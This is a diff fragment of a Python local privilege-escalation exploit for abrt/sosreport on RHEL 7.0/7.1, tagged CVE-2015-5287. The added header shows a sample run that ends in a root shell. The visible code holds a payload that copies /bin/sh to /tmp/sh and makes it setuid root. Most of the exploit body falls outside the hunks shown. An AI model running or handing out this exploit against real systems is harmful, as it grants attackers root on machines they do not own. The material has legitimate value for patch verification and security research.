@@ -1,3 +1,27 @@
+#!/usr/bin/python
+# CVE-2015-5287 (?)
+# abrt/sosreport RHEL 7.0/7.1 local root
+# rebel 09/2015
+
+# [user@localhost ~]$ python sosreport-rhel7.py
+# crashing pid 19143
+# waiting for dump directory
+# dump directory:  /var/tmp/abrt/ccpp-2015-11-30-19:41:13-19143
+# waiting for sosreport directory
+# sosreport:  sosreport-localhost.localdomain-20151130194114
+# waiting for tmpfiles
+# tmpfiles:  ['tmpurfpyY', 'tmpYnCfnQ']
+# moving directory
+# moving tmpfiles
+# tmpurfpyY -> tmpurfpyY.old
+# tmpYnCfnQ -> tmpYnCfnQ.old
+# waiting for sosreport to finish (can take several minutes)........................................done
+# success
+# bash-4.2# id
+# uid=0(root) gid=1000(user) groups=0(root),1000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+# bash-4.2# cat /etc/redhat-release 
+# Red Hat Enterprise Linux Server release 7.1 (Maipo)
+
 import os,sys,glob,time,sys,socket
 
 payload = "#!/bin/sh\ncp /bin/sh /tmp/sh\nchmod 6755 /tmp/sh\n"
@@ -88,3 +112,4 @@ for x in xrange(0,60*10):
 	sys.stderr.write(".")
 
 print "timed out"
+            
